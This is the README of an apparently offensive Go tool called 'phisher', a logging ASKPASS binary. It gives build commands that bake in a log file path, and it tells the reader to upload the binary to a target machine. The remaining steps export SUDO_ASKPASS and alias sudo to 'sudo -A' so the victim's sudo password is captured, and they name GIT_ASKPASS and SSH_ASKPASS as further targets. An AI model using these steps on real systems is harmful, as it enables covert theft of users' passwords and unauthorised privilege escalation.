A logging ASKPASS binary

## Usage

Currently I'm baking in the logfile location since pipes and args are used by ASKPASS consumers.
Maybe adding the reading of ENV variables makes sense. PRs welcome.

You can modify source with the desired log path and recompile, or use the linker to override at compile-time

```bash
go build -o phisher -ldflags=-X main.filename=/tmp/sudo.log 
```

Upload to the machine whose sudo password you want logged and modify the user's ENV:


```
export SUDO_ASKPASS=/tmp/phisher
alias sudo='sudo -A'
```


Other potential targets variables

```
GIT_ASKPASS
SSH_ASKPASS
```
